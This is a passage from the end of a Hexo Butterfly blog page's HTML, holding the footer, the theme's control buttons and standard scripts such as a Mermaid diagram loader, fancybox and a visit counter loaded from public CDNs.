id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
